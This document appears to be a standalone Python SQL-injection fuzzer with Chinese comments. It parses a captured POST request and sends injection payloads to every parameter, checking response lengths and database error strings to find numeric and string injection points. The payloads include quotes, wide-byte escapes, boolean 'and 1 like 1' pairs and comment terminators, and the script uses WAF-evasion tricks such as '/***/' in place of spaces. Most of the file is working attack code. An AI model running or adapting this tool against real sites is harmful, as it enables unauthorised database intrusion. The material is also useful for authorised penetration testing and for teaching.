# post注入
# 先用特殊字符检测，然后判断是数字型还是字符型注入
# 用/***/替换空格，用like替换=   具体案例看漏洞集合\骚姿势漏洞\绕Waf注入
import requests
from termcolor import cprint
import threading
from queue import Queue

event = threading.Event()
event.set()
q = Queue(-1)

class Fuzz:

    def __init__(self, postPath, url=None, cookie=None):
        self.postPath = postPath
        self.url = ''
        self.params = ''
        self.headers = {}
        self.get_headers_postdata()     # 获取post里的url, headers, data
        self.paramsList = self.params.split('&')       # 将字符串型的参数改为已&分割的列表
        self.standard_length = len(requests.post(url=self.url, data=self.params, headers=self.headers).text)  # 正常url响应包的长度
        # 单引号，双引号，宽字节+单引号，宽字节+双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        self.test = ["'", '"', '%df%27', '%df%22', '\\', '/***/or', '/***/xor', '@', '%', '$', '^', '!', '[']
        self.Notes = [" ", '--+', '%23']  # 不加注释和加注释符
        self.quotes_brackets = ['\\', "'", '"', "')", '")']  # 单引号，双引号，括号  quotes:引号 brackets:括号
        # 精简版：↓
        self.digit_bypass = [['{``1=1}', '{``1=2}'], ['1 like 1', '1 like 2'], ['1', '0'], ['2<<1', '0<<2'], ['1||1', '0||0'],
                             ['1&&1', '0&&1']]

        self.nums = len(self.paramsList) * len(self.test) + len(self.paramsList) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes)   # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url[:-1], self.params), 'red')     # 打印正常包的响应长度
        self.num = 1
        self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads = [], [], [], []

    def get_headers_postdata(self, protocol='http'):

        flag = False  # 标志，当设置为True时，开始取post包里的data数据

        with open(self.postPath, 'rt') as f:
            path = str(f.readline()).split(' ')[1]
            host = str(f.readline()).split(': ')[1][:-1]
            # 上传文件的url
            self.url = protocol + '://' + host + path

            for each in f.readlines():
                # 获取post包里的data数据
                if flag:
                    self.params = each
                    continue

                # 因为referer这一行有2个冒号
                if 'Referer' in each:
                    self.headers['Referer'] = each[9:-1]
                    continue

                # 因为User-Agen这一行有多个冒号
                if 'User-Agent' in each:
                    self.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
                    continue

                # 在Content-Length后面都是提交的数据包
                if '\n' == each:
                    flag = True  # 开始获取post包的data数据
                    continue

                # 获取post内的请求头数据
                _key = each.split(': ')[0]
                _value = each.split(': ')[1][:-1]
                self.headers[_key] = _value


    # 返回请求url的响应包和响应包长度
    def text_length_return(self, payload_data):
        try:
            text = requests.post(url=self.url, data=payload_data, headers=self.headers).text
            return text, len(text)
        except Exception as e:
            return '', 0

    # 单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测
    def test_sql(self):
        '''
            单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        '''
        for i in range(len(self.paramsList)):
            for each_test in self.test:
                payload_data = self.paramsList[i] + each_test
                payload_data = self.params.replace(self.paramsList[i], payload_data)  # 构造成要提交的payload
                text, payload_length = self.text_length_return(payload_data)  # payload_length1是请求带payload的响应包的长度
                print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length, payload_data))

                # 当请求错误的时候，payload_length1的值为0，然后退出该循环
                if self.standard_length == 0 or payload_length == 0:
                    cprint('[连接错误] : {}'.format(payload_data), 'red')
                    continue

                if 'SQL syntax' in text:
                    out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length, payload_data)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'Warning' in text:
                    out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length, payload_data)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'mysql_error' in text:
                    out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length, payload_data)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif self.standard_length != payload_length:
                    out_ret = '[${}$] 可能存在数字注入  [{}] payload : [{}]'.format(self.num, payload_length, payload_data)
                    cprint(out_ret, "blue")
                    self.BluePayloads.append(out_ret)
                else:
                    out_ret = '[-{}-] 不是数字型注入。'.format(self.num)
                    #cprint(out_ret, 'green')
                    self.GreenPayloads.append(out_ret)

                self.num += 1


    # 请求数字型payload
    def req_digit_payload(self):
        '''
            因为是判断数字型，所以不需要注释符。
        '''
        for i in range(len(self.paramsList)):
            for each_pass in self.digit_bypass:
                #temp = self.params[:]                   # 利用切片的复制，将原始参数赋给temp变量

                payload_data1 = self.paramsList[i] + '/***/and/***/{}'.format(each_pass[0])
                payload_data1 = self.params.replace(self.paramsList[i], payload_data1) # 构造成要提交的payload
                text1, payload_length1 = self.text_length_return(payload_data1)       # payload_length1是请求带payload的响应包的长度
                payload_data2 = self.paramsList[i] + '/***/and/***/{}'.format(each_pass[1])
                payload_data2 = self.params.replace(self.paramsList[i], payload_data2)
                text2, payload_length2 = self.text_length_return(payload_data2)
                print('[{}] 测试 : [{}] {}'.format(self.num, payload_length1, payload_data1))
                print('[{}] 测试 : [{}] {}'.format(self.num,payload_length2, payload_data2))

                # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
                if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                    out_ret = '[+{}+] 数字型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                    cprint(out_ret, "red")
                    self.RedPayloads.append(out_ret)
                elif 'SQL syntax' in text1 or 'SQL syntax' in text2:
                    out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'Warning' in text1 or 'Warning' in text2:
                    out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'mysql_error' in text1 or 'mysql_error' in text2:
                    out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif self.standard_length != payload_length1:
                    out_ret = '[${}$] 可能存在数字注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                    cprint(out_ret, "blue")
                    self.BluePayloads.append(out_ret)
                else:
                    out_ret = '[-{}-] 不是数字型注入。'.format(self.num)
                    # cprint(out_ret, 'green')
                    self.GreenPayloads.append(out_ret)

                self.num += 1


    # 请求字符型payload
    def req_char_payload(self):
        '''
            因为是判断字符型，所以需要注释符。
        '''

        for i in range(len(self.paramsList)):
            for each in self.quotes_brackets:
                for note in self.Notes:
                    payload_data1 = self.paramsList[i] + "{}/***/and/***/1/***/like/***/1 {}".format(each, note)
                    payload_data1 = self.params.replace(self.paramsList[i], payload_data1)  # 构造成要提交的payload
                    text1, payload_length1 = self.text_length_return(payload_data1)  # payload_length1是请求带payload的响应包的长度
                    payload_data2 = self.paramsList[i] + "{}/***/and/***/1/***/like/***/2 {}".format(each, note)
                    payload_data2 = self.params.replace(self.paramsList[i], payload_data2)
                    text2, payload_length2 = self.text_length_return(payload_data2)
                    print('[{}] 测试 : [{}] {}'.format(self.num, payload_length1, payload_data1))
                    print('[{}] 测试 : [{}] {}'.format(self.num, payload_length2, payload_data2))

                    # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
                    if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                        out_ret = '[+{}+] 字符型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                        cprint(out_ret, "red")
                        self.RedPayloads.append(out_ret)
                    elif 'SQL syntax' in text1 or 'SQL syntax' in text2:
                        out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif 'Warning' in text1 or 'Warning' in text2:
                        out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif 'mysql_error' in text1 or 'mysql_error' in text2:
                        out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif self.standard_length != payload_length1:
                        out_ret = '[${}$] 可能存在字符型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload_data1)
                        cprint(out_ret, "blue")
                        self.BluePayloads.append(out_ret)
                    else:
                        out_ret = '[-{}-] 不是字符型注入。'.format(self.num)
                        # cprint(out_ret, 'green')
                        self.GreenPayloads.append(out_ret)

                    self.num += 1
    # 攻击
    def attack(self):
        #self.test_sql()
        #self.req_digit_payload()
        self.req_char_payload()
        return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads

# 这是单独使用脚本
postPath = r'C:\Users\Asus\Desktop\py\py3\project\sql_inject_fuzz\post.txt'
Fuzz(postPath).attack()
